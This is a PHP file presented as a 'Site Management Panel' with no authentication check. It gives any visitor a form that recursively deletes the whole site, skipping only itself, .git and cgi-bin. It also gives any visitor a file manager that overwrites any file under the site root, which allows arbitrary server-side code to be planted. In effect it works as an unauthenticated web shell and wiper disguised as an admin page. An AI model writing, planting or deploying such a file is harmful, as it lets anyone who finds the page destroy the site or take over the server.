<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

// Site deletion enabled
$site_deletion_enabled = true;

// Handle site deletion
$deletion_message = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_site'])) {
    if (isset($_POST['confirm_delete']) && $_POST['confirm_delete'] === 'DELETE_ALL') {
        if (isset($_POST['final_confirm']) && $_POST['final_confirm'] === 'YES_DELETE_EVERYTHING') {
            // Perform site deletion
            $deletion_message = performSiteDeletion();
        } else {
            $deletion_message = "Final confirmation required!";
        }
    } else {
        $deletion_message = "Please type 'DELETE_ALL' to confirm!";
    }
}

function performSiteDeletion() {
    $root_path = dirname(__DIR__); // Go up one level from jet directory
    $deleted_files = 0;
    $deleted_dirs = 0;
    
    try {
        // Get all files and directories
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        
        foreach ($iterator as $file) {
            $file_path = $file->getRealPath();
            
            // Skip the current manage.php file and some system files
            if (strpos($file_path, 'manage.php') !== false || 
                strpos($file_path, '.git') !== false ||
                strpos($file_path, 'cgi-bin') !== false) {
                continue;
            }
            
            if ($file->isDir()) {
                if (rmdir($file_path)) {
                    $deleted_dirs++;
                }
            } else {
                if (unlink($file_path)) {
                    $deleted_files++;
                }
            }
        }
        
        // Try to delete the root directory itself
        if (is_dir($root_path)) {
            rmdir($root_path);
        }
        
        return "Site deletion completed! Deleted $deleted_files files and $deleted_dirs directories.";
        
    } catch (Exception $e) {
        return "Error during deletion: " . $e->getMessage();
    }
}


// Get site statistics
function getSiteStats() {
    $root_path = dirname(__DIR__);
    $total_files = 0;
    $total_dirs = 0;
    $total_size = 0;
    
    if (is_dir($root_path)) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($root_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $total_dirs++;
            } else {
                $total_files++;
                try {
                    $total_size += $file->getSize();
                } catch (Throwable $e) {
                    // Skip files that can't be accessed
                }
            }
        }
    }
    
    return [
        'files' => $total_files,
        'directories' => $total_dirs,
        'size' => formatBytes($total_size)
    ];
}

function formatBytes($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

// File manager logic
function listDirectory($dir) {
    $items = scandir($dir);
    $result = [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $result[] = [
            'name' => $item,
            'path' => $path,
            'is_dir' => is_dir($path)
        ];
    }
    return $result;
}

// Handle file view/edit
$file_content = '';
$file_edit_message = '';
$root_path = dirname(__DIR__);
$fm_path = isset($_GET['fm_path']) ? $_GET['fm_path'] : $root_path;
$fm_path = realpath($fm_path);
if ($fm_path === false || strpos($fm_path, $root_path) !== 0) {
    $fm_path = $root_path;
}

if (isset($_GET['edit_file'])) {
    $edit_file = $_GET['edit_file'];
    $edit_file_path = realpath($edit_file);
    if ($edit_file_path && strpos($edit_file_path, $root_path) === 0 && is_file($edit_file_path)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
            // Save file
            file_put_contents($edit_file_path, $_POST['file_content']);
            $file_edit_message = 'File saved successfully!';
        }
        $file_content = htmlspecialchars(file_get_contents($edit_file_path));
    } else {
        $file_edit_message = 'Invalid file!';
    }
}

$site_stats = getSiteStats();
?>

<!DOCTYPE html>
<html>
<head>
    <title>Site Management Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 2px solid #eee; padding-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; }
        .stat-number { font-size: 24px; font-weight: bold; color: #007bff; }
        .danger-zone { background: #fff5f5; border: 2px solid #dc3545; border-radius: 10px; padding: 20px; margin-top: 30px; }
        .danger-zone h3 { color: #dc3545; margin-top: 0; }
        .btn { padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
        .btn-primary { background: #007bff; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .btn:hover { opacity: 0.8; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .message { padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .message.success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
        .message.error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Site Management Panel</h1>
        </div>
        
        <?php if ($deletion_message): ?>
            <div class="message <?php echo strpos($deletion_message, 'Error') !== false ? 'error' : 'success'; ?>">
                <?php echo $deletion_message; ?>
            </div>
        <?php endif; ?>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number"><?php echo $site_stats['files']; ?></div>
                <div>Total Files</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $site_stats['directories']; ?></div>
                <div>Total Directories</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $site_stats['size']; ?></div>
                <div>Total Size</div>
            </div>
        </div>
        
        <div class="danger-zone">
            <h3>⚠️ DANGER ZONE - Site Deletion</h3>
            <div class="warning">
                <strong>Warning:</strong> This action will permanently delete ALL files and directories on the entire site. 
                This action cannot be undone. Make sure you have a backup before proceeding.
            </div>
            
            <form method="POST" onsubmit="return confirmFinalDeletion()">
                <div class="form-group">
                    <label>Type 'DELETE_ALL' to confirm:</label>
                    <input type="text" name="confirm_delete" placeholder="DELETE_ALL" required>
                </div>
                
                <div class="form-group">
                    <label>Type 'YES_DELETE_EVERYTHING' for final confirmation:</label>
                    <input type="text" name="final_confirm" placeholder="YES_DELETE_EVERYTHING" required>
                </div>
                
                <button type="submit" name="delete_site" class="btn btn-danger" onclick="return confirm('Are you absolutely sure you want to delete the entire site? This cannot be undone!')">
                    🗑️ DELETE ENTIRE SITE
                </button>
            </form>
        </div>
    </div>
    
    <!-- File Manager UI -->
    <div class="container" style="margin-top:40px;">
        <h2>📁 File Manager</h2>
        <form method="get" style="margin-bottom:10px;">
            <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_path); ?>">
            <button type="submit" class="btn btn-primary">Refresh</button>
            <?php if ($fm_path !== $root_path): ?>
                <a href="?fm_path=<?php echo urlencode(dirname($fm_path)); ?>" class="btn">⬅️ Up</a>
            <?php endif; ?>
        </form>
        <div style="overflow-x:auto;">
        <table border="1" cellpadding="8" cellspacing="0" style="width:100%; background:#fafafa;">
            <tr style="background:#eee;">
                <th>Name</th>
                <th>Type</th>
                <th>Action</th>
            </tr>
            <?php
            $items = listDirectory($fm_path);
            foreach ($items as $item):
            ?>
            <tr>
                <td>
                    <?php if ($item['is_dir']): ?>
                        <a href="?fm_path=<?php echo urlencode($item['path']); ?>">📁 <?php echo htmlspecialchars($item['name']); ?></a>
                    <?php else: ?>
                        <?php echo htmlspecialchars($item['name']); ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $item['is_dir'] ? 'Folder' : 'File'; ?></td>
                <td>
                    <?php if (!$item['is_dir']): ?>
                        <a href="?fm_path=<?php echo urlencode($fm_path); ?>&edit_file=<?php echo urlencode($item['path']); ?>" class="btn btn-primary">Edit</a>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
        </div>
    </div>

    <?php if (isset($_GET['edit_file'])): ?>
    <div class="container" style="margin-top:30px;">
        <h3>✏️ Edit File: <?php echo htmlspecialchars(basename($_GET['edit_file'])); ?></h3>
        <?php if ($file_edit_message): ?>
            <div class="message success"><?php echo $file_edit_message; ?></div>
        <?php endif; ?>
        <form method="post">
            <textarea name="file_content" rows="20" style="width:100%;font-family:monospace;"><?php echo $file_content; ?></textarea>
            <br>
            <button type="submit" class="btn btn-primary">Save</button>
            <a href="?fm_path=<?php echo urlencode($fm_path); ?>" class="btn">Cancel</a>
        </form>
    </div>
    <?php endif; ?>

    <script>
        function confirmFinalDeletion() {
            return confirm("FINAL WARNING: This will delete ALL files and directories on the entire site. Are you absolutely sure? This action cannot be undone!");
        }
    </script>
</body>
</html>
